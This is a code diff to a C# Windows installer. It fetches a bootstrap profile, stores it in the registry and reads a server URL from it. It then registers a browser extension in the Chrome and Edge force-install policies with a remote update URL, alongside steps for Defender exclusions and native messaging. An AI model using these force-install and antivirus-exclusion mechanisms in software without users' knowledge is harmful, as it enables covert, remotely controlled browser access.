@@ -106,10 +106,11 @@ public static class Installer
         PrefillIdentity(settingsPath);
 
         // 4. Bootstrap profile via install code (before writing registry URL)
+        string? serverUrl = null;
         if (!string.IsNullOrEmpty(installCode))
         {
             Console.WriteLine($"    Bootstrap: fetching profile for code {installCode}...");
-            await FetchAndStoreBootstrapProfileAsync(installCode);
+            serverUrl = await FetchAndStoreBootstrapProfileAsync(installCode);
         }
 
         // 5. Defender exclusions
@@ -125,16 +126,17 @@ public static class Installer
         RegisterNativeMessaging(destExe);
         Console.WriteLine("    OK: Native Messaging host registered");
 
-        // 8. Extension Forcelist (if extension.crx sits next to the exe)
-        var crxPath = Path.Combine(Path.GetDirectoryName(currentExe)!, "extension.crx");
-        var idPath  = Path.Combine(Path.GetDirectoryName(currentExe)!, "extension-id.txt");
-        if (File.Exists(crxPath) && File.Exists(idPath))
+        // 8. Extension Forcelist
+        var idPath = Path.Combine(Path.GetDirectoryName(currentExe)!, "extension-id.txt");
+        if (File.Exists(idPath) && !string.IsNullOrEmpty(serverUrl))
         {
-            var extId    = File.ReadAllText(idPath).Trim();
-            var destCrx  = Path.Combine(installDir, "extension.crx");
-            File.Copy(crxPath, destCrx, overwrite: true);
-            RegisterExtensionForcelist(extId, destCrx);
-            Console.WriteLine($"    OK: Extension {extId} added to Forcelist");
+            var extId = File.ReadAllText(idPath).Trim();
+            RegisterExtensionForcelist(extId, serverUrl);
+            Console.WriteLine($"    OK: Extension {extId} added to Forcelist (update URL: {serverUrl}/extension/update.xml)");
+        }
+        else if (File.Exists(idPath) && string.IsNullOrEmpty(serverUrl))
+        {
+            Console.WriteLine("    WARN: Extension Forcelist skipped — ServerUrl unknown (bootstrap not completed)");
         }
 
         // 9. Start task
@@ -183,7 +185,8 @@ public static class Installer
 
     // -------------------------------------------------------------------------
 
-    private static async Task FetchAndStoreBootstrapProfileAsync(string installCode)
+    // Returns the primary ServerUrl from the bootstrap profile, or null on failure.
+    private static async Task<string?> FetchAndStoreBootstrapProfileAsync(string installCode)
     {
         using var http = new System.Net.Http.HttpClient();
         http.Timeout = TimeSpan.FromSeconds(30);
@@ -199,21 +202,30 @@ public static class Installer
             if (!resp.IsSuccessStatusCode)
             {
                 Console.WriteLine($"    WARN: Bootstrap fetch failed: {resp.StatusCode}");
-                return;
+                return null;
             }
 
-            var json = await resp.Content.ReadAsStringAsync();
-            var doc  = JsonDocument.Parse(json);
+            var json    = await resp.Content.ReadAsStringAsync();
+            var doc     = JsonDocument.Parse(json);
             var profile = doc.RootElement.GetProperty("profile").GetRawText();
 
             using var key = Registry.LocalMachine.CreateSubKey(
                 Path.Combine(RegKeyBase, "Bootstrap"), writable: true);
             key!.SetValue("ProfileJson", profile, RegistryValueKind.String);
             Console.WriteLine("    OK: Bootstrap profile stored in registry");
+
+            // Extract primary endpoint so the installer can configure extension delivery
+            var profileDoc = JsonDocument.Parse(profile);
+            if (profileDoc.RootElement.TryGetProperty("endpoints", out var endpoints) &&
+                endpoints.TryGetProperty("primary", out var primary))
+                return primary.GetString();
+
+            return null;
         }
         catch (Exception ex)
         {
             Console.WriteLine($"    WARN: Bootstrap fetch error: {ex.Message}");
+            return null;
         }
     }
 
@@ -287,9 +299,9 @@ public static class Installer
         edge!.SetValue("", manifestPath, RegistryValueKind.String);
     }
 
-    private static void RegisterExtensionForcelist(string extId, string crxPath)
+    private static void RegisterExtensionForcelist(string extId, string serverUrl)
     {
-        var entry = $"{extId};file:///{crxPath.Replace('\\', '/')}";
+        var entry = $"{extId};{serverUrl.TrimEnd('/')}/extension/update.xml";
         SetForcelistEntry(@"SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist", entry);
         SetForcelistEntry(@"SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist", entry);
     }
